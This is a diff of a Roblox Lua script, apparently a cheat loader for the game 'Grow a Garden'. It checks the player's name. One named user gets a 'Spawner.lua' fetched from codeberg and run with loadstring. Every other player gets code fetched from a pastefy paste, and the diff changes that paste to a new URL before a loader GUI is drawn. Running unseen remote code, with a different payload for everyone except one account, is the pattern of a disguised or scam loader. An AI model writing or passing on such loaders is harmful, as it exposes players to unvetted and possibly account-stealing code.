@@ -167,7 +167,7 @@ task.spawn(function()
         -- --- PLAYER DETECTION LOGIC ---
         local player = game.Players.LocalPlayer
         if player and player.Name == "Zeen_2423" then
-            -- This is the original script URL for 'playsafe_kurt'
+            -- This is the original script URL for 'Zeen_2423'
            loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
         else
@@ -322,12 +322,12 @@ task.spawn(function()
         -- --- PLAYER DETECTION LOGIC ---
         local player = game.Players.LocalPlayer
         if player and player.Name == "Zeen_2423" then
-            -- This is the original script URL for 'playsafe_kurt'
+            -- This is the original script URL for 'Zeen_2423'
            loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
         else
             -- This is for any other player
-            loadstring(game:HttpGet("https://pastefy.app/hXfnyJFv/raw"))()      
+            loadstring(game:HttpGet("https://pastefy.app/a8YOWDAX/raw"))()      
                 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.Name = "GrowAGardenLoader"
 gui.IgnoreGuiInset = true
